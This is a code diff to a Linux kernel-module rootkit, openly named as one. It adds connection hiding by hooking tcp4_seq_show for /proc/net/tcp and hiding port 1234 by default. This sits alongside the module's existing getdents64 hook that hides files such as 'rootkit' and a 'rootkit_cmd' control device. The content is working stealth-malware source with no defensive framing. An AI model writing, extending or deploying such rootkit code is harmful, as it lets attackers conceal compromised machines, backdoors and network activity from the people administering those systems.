@@ -59,7 +59,7 @@ static int getdents64_evil(const struct pt_regs *regs)
     if (copy_from_user(buf, dirent, size))
         goto out;
 
-    struct name_list *node;
+    struct struct_list *node;
     while ((unsigned long) iter - (unsigned long) buf < size) {
         read_lock(&file_black_list_lock);
         int found = 0;
@@ -85,8 +85,8 @@ out:
 
 void hide_file(const char *name)
 {
-    struct name_list *node =
-        (struct name_list *) vmalloc(sizeof(struct name_list));
+    struct struct_list *node =
+        (struct struct_list *) vmalloc(sizeof(struct struct_list));
     if (!node)
         return;
     node->name = vmalloc(strlen(name) + 1);
@@ -102,7 +102,7 @@ void hide_file(const char *name)
 
 void show_file(const char *name)
 {
-    struct name_list *node, *safe;
+    struct struct_list *node, *safe;
     write_lock(&file_black_list_lock);
     list_for_each_entry_safe (node, safe, &file_black_list, list) {
         if (!strcmp(name, node->name)) {
@@ -115,12 +115,67 @@ void show_file(const char *name)
     write_unlock(&file_black_list_lock);
 }
 
+DEFINE_RWLOCK(port_black_list_lock);
+LIST_HEAD(port_black_list);
+
+static int tcp4_seq_show_evil(struct seq_file *seq, void *v)
+{
+    if (v == SEQ_START_TOKEN)
+        goto RET;
+    struct inet_sock *sk = (struct inet_sock *) v;
+    struct struct_list *node;
+    read_lock(&port_black_list_lock);
+    list_for_each_entry (node, &port_black_list, list)
+        if (htons(node->num) == sk->inet_sport ||
+            htons(node->num) == sk->inet_dport) {
+            read_unlock(&port_black_list_lock);
+            return 0;
+        }
+    read_unlock(&port_black_list_lock);
+RET:
+    return CALL_ORIGINAL_FUNC_BY_NAME_RET(
+        "tcp4_seq_show", int (*)(struct seq_file *, void *), int, seq, v);
+}
+
+void hide_port(unsigned int port)
+{
+    struct struct_list *node =
+        (struct struct_list *) vmalloc(sizeof(struct struct_list));
+    if (!node)
+        return;
+    node->num = port;
+    write_lock(&port_black_list_lock);
+    list_add(&node->list, &port_black_list);
+    write_unlock(&port_black_list_lock);
+}
+
+void show_port(unsigned int port)
+{
+    struct struct_list *node, *safe;
+    write_lock(&port_black_list_lock);
+    list_for_each_entry_safe (node, safe, &port_black_list, list) {
+        if (port == node->num) {
+            list_del(&node->list);
+            vfree(node);
+            break;
+        }
+    }
+    write_unlock(&port_black_list_lock);
+}
+
 void utils_init()
 {
     chrdev_add("rootkit_cmd", &fops);
     hook_start(get_syscall(__NR_getdents64), (unsigned long) getdents64_evil,
                "sys_getdents64");
+    struct seq_operations *tcp_ops = proc_get_seq_ops_by_path("/proc/net/tcp");
+    if (tcp_ops) {
+        hook_start((unsigned long) tcp_ops->show,
+                   (unsigned long) tcp4_seq_show_evil, "tcp4_seq_show");
+    }
+
     hide_file("rootkit");
+    hide_port(1234);
 }
 
 static struct list_head *head = NULL;
